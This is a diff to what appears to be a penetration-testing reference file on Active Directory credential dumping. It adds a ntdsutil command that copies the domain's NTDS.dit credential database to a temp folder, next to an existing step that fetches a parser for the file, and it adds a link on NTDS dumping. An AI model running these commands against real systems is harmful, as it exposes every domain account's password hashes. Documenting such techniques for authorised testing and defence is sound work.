@@ -28,6 +28,13 @@ functions:
 
         REMINDER: If created on linux you will need to run unix2dos to convert the line returns
 
+    - description: Grab NTDS.dit with ntdsutil
+      code: |
+        where ntdsutil
+
+        In a command prompt
+        ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
+
     - description: Break Out the NTDS.dit file
       code: |
         wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz
@@ -51,5 +58,5 @@ functions:
 
 resources: |
   https://pentestlab.blog/tag/diskshadow/
-
+  https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds
 ---
